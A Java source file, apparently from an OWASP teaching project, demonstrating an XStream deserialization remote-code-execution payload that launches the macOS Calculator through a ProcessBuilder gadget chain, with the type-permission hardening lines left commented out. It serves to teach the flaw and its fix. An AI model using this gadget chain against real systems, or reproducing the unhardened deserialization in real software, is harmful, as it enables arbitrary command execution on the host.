package com.doku.doku_owasp_example.xxe.example;

import com.doku.doku_owasp_example.xxe.model.Note;
import com.thoughtworks.xstream.XStream;

/**
 * This only works on Java 8 & Java 11.
 *
 * @author Daniel Joi Partogi Hutapea
 */
public class XxeRemoteExecutionSimulation
{
    @SuppressWarnings("CommentedOutCode")
    public static void main(String[] args)
    {
        String sortedSortAttack = "" +
            "<sorted-set>\n" +
            "    <string>to</string>\n" +
            "    <dynamic-proxy>\n" +
            "        <interface>java.lang.Comparable</interface>\n" +
            "        <handler class=\"java.beans.EventHandler\">\n" +
            "            <target class=\"java.lang.ProcessBuilder\">\n" +
            "                <command>\n" +
            "                    <string>bash</string>\n" +
            "                    <string>-c</string>\n" +
            "                    <string>open /System/Applications/Calculator.app</string>\n" +
            "                </command>\n" +
            "            </target>\n" +
            "            <action>start.waitFor</action>\n" +
            "        </handler>\n" +
            "    </dynamic-proxy>\n" +
            "</sorted-set>";
 
        XStream xstream = new XStream();
         
        // Hardening XStream using these lines below. These codes below are only available on xstream >= 1.4.7.
        //xstream.addPermission(NoTypePermission.NONE);
        //xstream.addPermission(NullPermission.NULL);
        //xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
        //xstream.allowTypes(new Class<?>[] { Note.class });
         
        Note note = (Note) xstream.fromXML(sortedSortAttack);
 
        // XStream library execute this code below when deserialized the XML.
        //ProcessBuilder pb = new ProcessBuilder("bash", "-c", "open /System/Applications/Calculator.app");
        //Comparable comparable = EventHandler.create(Comparable.class, pb, "start.waitFor");
        //TreeSet treeSet = new TreeSet();
        //treeSet.add("to");
        //treeSet.add(comparable);
    }
}
